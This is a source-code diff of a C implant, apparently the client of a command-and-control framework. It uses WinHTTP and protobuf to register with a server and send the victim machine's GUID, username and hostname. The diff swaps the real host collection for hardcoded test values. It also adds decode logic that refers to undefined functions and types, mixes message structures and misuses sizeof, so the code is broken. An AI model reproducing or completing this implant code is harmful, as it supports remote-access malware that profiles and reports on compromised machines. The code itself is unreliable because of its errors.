@@ -17,24 +17,32 @@
 #include "implant.pb.h"
 
 
-LPSTR CSRFToken = "";
-
 LPBYTE *ImplantID;
 
-pb_ostream_t ReadyRegisterImplantToSend(uint8_t *buffer, RegisterImplant ri) {
-	// uint8_t buffer[4096];
-        pb_ostream_t stream = pb_ostream_from_buffer(buffer, sizeof(buffer));
-
-        if (!pb_encode(&stream, RegisterImplant_fields, &ri)) {
-                DEBUG_PRINTF("Encoding failed: %s\n", PB_GET_ERROR(&stream));
-        }
+// Function to RegisterImplant message
+BYTE *EncodeRegisterImplant(ImplantCheckin *ri, size_t *bufferSize) {
+	bool status = pb_get_encoded_size(bufferSize, RegisterImplant_fields, ri);
+	if (!status) {
+		DEBUG_PRINTF("Failed to get ImplantCheckin size: \n");
+		return NULL;
+	}
+	
+	BYTE *registerBuffer = (BYTE *)malloc(*bufferSize);
+	pb_ostream_t stream = pb_ostream_from_buffer(registerBuffer, *bufferSize);
+	
+	status = pb_encode(&stream, ImplantCheckin_fields, ri);
+	
+	if (!status) {
+		DEBUG_PRINTF("Encoding failed: %s\n", PB_GET_ERROR(&stream));
+		free(registerBuffer);
+		return NULL;
+	}
 
         printf("Successfully encoded: %llu\n", stream.bytes_written);
-	
-	return stream;
+	return registerBuffer;
 }
 
-LPSTR SentToServer(LPCWSTR VERB, LPCWSTR PATH, uint8_t *buffer, pb_ostream_t stream) {
+LPSTR SentToServer(LPCWSTR VERB, LPCWSTR PATH, uint8_t *buffer, size_t bytes_written) {
 
         // Initialize WinHTTP and send the request
         HINTERNET hSession = WinHttpOpen(L"A Custom User Agent",
@@ -63,44 +71,14 @@ LPSTR SentToServer(LPCWSTR VERB, LPCWSTR PATH, uint8_t *buffer, pb_ostream_t str
                         -1,
                         WINHTTP_ADDREQ_FLAG_ADD);
 
-	/**
-	// Add CSRF Token header
-	if (strcmp(CSRFToken, "")) {
-		char str[sizeof(CSRFToken) + sizeof("X-CSRFToken: ")];
-		strcpy(str, "X-CSRFToken: ");
-		strcat(str, CSRFToken);
-
-
-		int csrfBufferSize = MultiByteToWideChar(CP_UTF8,
-				MB_COMPOSITE,
-				str,
-				sizeof(str),
-				NULL,
-				sizeof(str));
-
-		LPWSTR csrfBuffer = malloc(csrfBufferSize);
-
-		csrfBufferSize = MultiByteToWideChar(CP_UTF8,
-                                MB_COMPOSITE,
-                                str,
-                                sizeof(str),
-                                csrfBuffer,
-                                sizeof(str));
-		
-		WinHttpAddRequestHeaders(hRequest,
-				csrfBuffer,
-				-1,
-				WINHTTP_ADDREQ_FLAG_ADD);
-	}
-	**/
 
         // Send the request
         if (!WinHttpSendRequest(hRequest,
                                 WINHTTP_NO_ADDITIONAL_HEADERS,
                                 0,
                                 buffer,
-                                stream.bytes_written,
-                                stream.bytes_written,
+                                sizeof(buffer),
+                                bytes_written,
 				0)) {
                 printf("Failed to send request. Error: %ld\n", GetLastError());
         }
@@ -180,13 +158,14 @@ void ReadMachineGUID() {
 	}
 }
 
+size_t message_length;
 // Function to register Implant with the Server
 int RegisterSelf() {
 	RegisterImplant ri = RegisterImplant_init_zero;
 	
-	ReadMachineGUID();
-	ri.GUID = (char *)ImplantID;
-	
+	// ReadMachineGUID();
+
+	/**
 	DWORD dwSizeUser = MAX_PATH;
 	DWORD dwSizeHostname = MAX_PATH;
 	char username[MAX_PATH];
@@ -197,18 +176,35 @@ int RegisterSelf() {
 	GetComputerNameA(hostname, &dwSizeHostname);
 	DEBUG_PRINTF("GetComputerNameA = %s", username);
 
-	ri.Hostname = hostname;
-	ri.Username = username;
+	**/
+
+	ri.GUID = "1234567890";
+	ri.Hostname = "test";
+	ri.Username = "userwoozer";
 	ri.Password = "pass";
 
-	uint8_t buffer[4096];
-	pb_ostream_t stream = ReadyRegisterImplantToSend(buffer, ri);
-	LPCSTR response = SentToServer(POST_VERB, REGISTER_PATH, buffer, stream);
+	BYTE buffer[4096];
+	size_t bufferSize = sizeof(buffer);
+	
+	pb_ostream_t stream = pb_ostream_from_buffer(buffer, bufferSize);
+	
+	bool status = pb_encode(&stream, Register_fields, &reg);
+	
+	if (!status) {
+		DEBUG_PRINTF("Encoding failed: %s\n", PB_GET_ERROR(&stream));
+		return 1;
+	}
+
+	BYTE *registerBuffer = EncodeImplantCheckin(&ri, &bufferSize);
+
+	/**
+	LPCSTR response = SentToServer(POST_VERB, REGISTER_PATH, buffer, stream.bytes_written);
 	
 	if (strcmp(response, "")){
                 DEBUG_PRINTF("Bad response.");
-                DEBUG_PRINTF("response = %s", response);
+                // DEBUG_PRINTF("response = %s", response);
         }
+	**/
 	
 	return 0;
 }
@@ -224,7 +220,31 @@ int main() {
 		return 1;
 	}
 	printf("Successfully registered implant with Server!\n");
-	
+
+	uint8_t buffer[128];
+	bool status;
+
+	/* Allocate space for the decoded message. */
+        RegisterImplant message = RegisterImplant_init_zero;
+
+        /* Create a stream that reads from the buffer. */
+        pb_istream_t stream = pb_istream_from_buffer(buffer, message_length);
+
+        /* Now we are ready to decode the message. */
+        status = pb_decode(&stream, RegisterImplant_fields, &message);
+
+        /* Check for errors... */
+        if (!status)
+        {
+            printf("Decoding failed: %s\n", PB_GET_ERROR(&stream));
+            return 1;
+        }
+
+	printf("%s\n", message.Username);
+        printf("%s\n", message.Password);
+        printf("%s\n", message.GUID);
+        printf("%s\n", message.Hostname);
+
 	return 0;
 }
 
